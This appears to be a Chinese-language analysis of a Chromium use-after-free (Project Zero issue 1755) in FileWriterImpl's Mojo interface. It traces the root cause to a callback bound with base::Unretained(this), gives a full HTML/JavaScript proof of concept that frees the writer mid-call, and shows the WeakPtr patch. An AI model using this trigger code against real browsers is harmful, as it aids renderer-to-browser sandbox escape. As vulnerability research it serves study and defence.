https://bugs.chromium.org/p/project-zero/issues/detail?id=1755
### Root case

我们先从接口开始看起

```
// Interface provided to the renderer to let a renderer write data to a file.
interface FileWriter {
 // Write data from |blob| to the given |position| in the file being written
 // to. Returns whether the operation succeeded and if so how many bytes were
 // written.
 // TODO(mek): This might need some way of reporting progress events back to
 // the renderer.
 Write(uint64 position, Blob blob) => (mojo_base.mojom.FileError result,
                                       uint64 bytes_written);    //<-----------bug case

 // Write data from |stream| to the given |position| in the file being written
 // to. Returns whether the operation succeeded and if so how many bytes were
 // written.
 // TODO(mek): This might need some way of reporting progress events back to
 // the renderer.
 WriteStream(uint64 position, handle<data_pipe_consumer> stream) =>
       (mojo_base.mojom.FileError result, uint64 bytes_written);

 // Changes the length of the file to be |length|. If |length| is larger than
 // the current size of the file, the file will be extended, and the extended
 // part is filled with null bytes.
 Truncate(uint64 length) => (mojo_base.mojom.FileError result);
};
```

FileWriter被FileSystemManager管理，在FileSystemManager中有一个CreateWriter方法，用来创建FileWriter。

```
// Interface provided by the browser to the renderer to carry out filesystem
// operations. All [Sync] methods should only be called synchronously on worker
// threads (and asynchronously otherwise).
interface FileSystemManager {
 // ...

 // Creates a writer for the given file at |file_path|.
 CreateWriter(url.mojom.Url file_path) =>
     (mojo_base.mojom.FileError result,
      blink.mojom.FileWriter? writer);

 // ...
};


void FileSystemManagerImpl::CreateWriter(const GURL& file_path,
                                        CreateWriterCallback callback) {
 DCHECK_CURRENTLY_ON(BrowserThread::IO);
...
 blink::mojom::FileWriterPtr writer;
 mojo::MakeStrongBinding(std::make_unique<storage::FileWriterImpl>(
                             url, context_->CreateFileSystemOperationRunner(),
                             blob_storage_context_->context()->AsWeakPtr()),
                         MakeRequest(&writer));
 std::move(callback).Run(base::File::FILE_OK, std::move(writer));
}
```

MakeRequest来创建message pipe，他接收一个FileWriterPtr writer作为参数，该参数和message pipe的remote端连接，之后函数返回message pipe的receiver端。

这里通过MakeStrongBinding将FileWriterImpl实例和receiver绑定到一起，效果同以往的Self-owned Receivers，此时FileWriterImpl的生命周期和message pipe绑定，只要message pipe不断开，则FileWriterImpl永远不会被释放。

这里FileWrite的生命周期并没有被FileSystemManager所管理，我们是可以断开message pipe的方法来析构掉FileWrite的。

最后通过std::move(callback).Run来将FileWriterPtr writer作为response返回给CreateWriter的调用者，这样调用者就可以通过writer来调用FileWriterImpl实例里的方法FileWriterImpl::Write了

```
void FileWriterImpl::Write(uint64_t position,
                          blink::mojom::BlobPtr blob,
                          WriteCallback callback) {
 blob_context_->GetBlobDataFromBlobPtr(
     std::move(blob),
     base::BindOnce(&FileWriterImpl::DoWrite, base::Unretained(this),
                    std::move(callback), position));
}
```
这里很有意思，他的参数BlobPtr我们是可以在js层控制的。这个漏洞的一个关键就是DoWrite的参数base::Unretained(this)，被Unretained修饰的this指针，只由回调的调用者来保证回调执行时，this指针仍然可用。这里如果换成WeakPtr，那么在this被析构后，回调就不会被执行。

```
void BlobStorageContext::GetBlobDataFromBlobPtr(
   blink::mojom::BlobPtr blob,
   base::OnceCallback<void(std::unique_ptr<BlobDataHandle>)> callback) {
 DCHECK(blob);
 blink::mojom::Blob* raw_blob = blob.get();
 raw_blob->GetInternalUUID(mojo::WrapCallbackWithDefaultInvokeIfNotRun(
     base::BindOnce(
         [](blink::mojom::BlobPtr, base::WeakPtr<BlobStorageContext> context,
            base::OnceCallback<void(std::unique_ptr<BlobDataHandle>)> callback,
            const std::string& uuid) {
           if (!context || uuid.empty()) {
             std::move(callback).Run(nullptr);
             return;
           }
           std::move(callback).Run(context->GetBlobDataFromUUID(uuid));
         },
         std::move(blob), AsWeakPtr(), std::move(callback)),
     ""));
}
```
在这里调用了raw_blob->GetInternalUUID函数，因为raw_blob来自于js层，所以只要我们满足他的mojo idl接口即可自定义函数。

```
// This interface provides access to a blob in the blob system.
interface Blob {
 // Creates a copy of this Blob reference.
 Clone(Blob& blob);
// This method is an implementation detail of the blob system. You should not
 // ever need to call it directly.
 // This returns the internal UUID of the blob, used by the blob system to
 // identify the blob.
 GetInternalUUID() => (string uuid);
}
...
...
  function BlobImpl() {
    this.binding = new mojo.Binding(blink.mojom.Blob, this);
  }

  BlobImpl.prototype = {
    clone: async (arg0) => {
      console.log('clone');
    },
    asDataPipeGetter: async (arg0, arg1) => {
      console.log("asDataPipeGetter");
    },
    readAll: async (arg0, arg1) => {
      console.log("readAll");
    },
    readRange: async (arg0, arg1, arg2, arg3) => {
      console.log("readRange");
    },
    readSideData: async (arg0) => {
      console.log("readSideData");
    },
    getInternalUUID: async (arg0) => {
      console.log("getInternalUUID");
      create_writer_result.writer.ptr.reset();
      return {'uuid': 'blob_0'};
    }
  };
```

raw_blob->GetInternalUUID，其参数是一个callback，他最终就是调用FileWriterImpl::DoWrite，并将从uuid得到的BlobData，作为DoWrite的最后一个参数std::unique_ptr<BlobDataHandle> blob。

我们可以自定义getInternalUUID，将之前建立好的message pipe给断开，从而析构掉之前创建出的FileWriterImpl对象。这样再去调用DoWrite就会触发uaf。


### poc

```
<html>
  <body>
    <script src="/mojo_bindings.js"></script>
    <script src="/third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
    <script src="/third_party/blink/public/mojom/filesystem/file_system.mojom.js"></script>
    <script>
(async function poc() {
  let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
  Mojo.bindInterface(blink.mojom.BlobRegistry.name,
                     mojo.makeRequest(blob_registry_ptr).handle, "process");

  function BytesProviderImpl() {
    this.binding = new mojo.Binding(blink.mojom.BytesProvider, this);
  }

  BytesProviderImpl.prototype = {
    requestAsReply: async () => {
      console.log('requestAsReply');
    },
    requestAsStream: async (arg0) => {
      console.log('requestAsStream');
    },
    requestAsFile: async (arg0, arg1, arg2, arg3) => {
      console.log('requestAsFile');
    }
  };

  base_bytes = new BytesProviderImpl();
  base_bytes_ptr = new blink.mojom.BytesProviderPtr();
  base_bytes.binding.bind(mojo.makeRequest(base_bytes_ptr));

  let base_blob_element = new blink.mojom.DataElement();
  base_blob_element.bytes = new blink.mojom.DataElementBytes();
  base_blob_element.bytes.length = 2;
  base_blob_element.bytes.embeddedData = [0x41, 0x41];
  base_blob_element.bytes.data = base_bytes_ptr;

  let base_blob_ptr = new blink.mojom.BlobPtr();
  let base_blob_req = mojo.makeRequest(base_blob_ptr);
  blob_registry_ptr.register(base_blob_req, "blob_0", "text/html", "", [base_blob_element]);

  let file_system_manager_ptr = new blink.mojom.FileSystemManagerPtr();
  Mojo.bindInterface(blink.mojom.FileSystemManager.name,
                   mojo.makeRequest(file_system_manager_ptr).handle, "process");

  let host_url = new url.mojom.Url();
  host_url.url = 'http://localhost:7007';

  let open_result = await file_system_manager_ptr.open(host_url, 0);
  console.log(open_result);

  let file_url = new url.mojom.Url();
  file_url.url = open_result.rootUrl.url + '/pwned';

  let create_writer_result = await file_system_manager_ptr.createWriter(file_url);
  console.log(create_writer_result);

  function BlobImpl() {
    this.binding = new mojo.Binding(blink.mojom.Blob, this);
  }

  BlobImpl.prototype = {
    clone: async (arg0) => {
      console.log('clone');
    },
    asDataPipeGetter: async (arg0, arg1) => {
      console.log("asDataPipeGetter");
    },
    readAll: async (arg0, arg1) => {
      console.log("readAll");
    },
    readRange: async (arg0, arg1, arg2, arg3) => {
      console.log("readRange");
    },
    readSideData: async (arg0) => {
      console.log("readSideData");
    },
    getInternalUUID: async (arg0) => {
      console.log("getInternalUUID");
      create_writer_result.writer.ptr.reset();
      return {'uuid': 'blob_0'};
    }
  };

  let blob_impl = new BlobImpl();
  let blob_impl_ptr = new blink.mojom.BlobPtr();
  blob_impl.binding.bind(mojo.makeRequest(blob_impl_ptr));

  create_writer_result.writer.write(0, blob_impl_ptr);
})();
    </script>
  </body>
</html>
```

### patch
```
   blob_context_->GetBlobDataFromBlobPtr(
       std::move(blob),
-      base::BindOnce(&FileWriterImpl::DoWrite, base::Unretained(this),
+      base::BindOnce(&FileWriterImpl::DoWrite, weak_ptr_factory_.GetWeakPtr(),
                      std::move(callback), position));
```
把base::Unretained(this)换成了weak_ptr_factory_.GetWeakPtr()，这样如果当前FileWriterImpl实例被析构掉了，则&FileWriterImpl::DoWrite回调不会被调用。

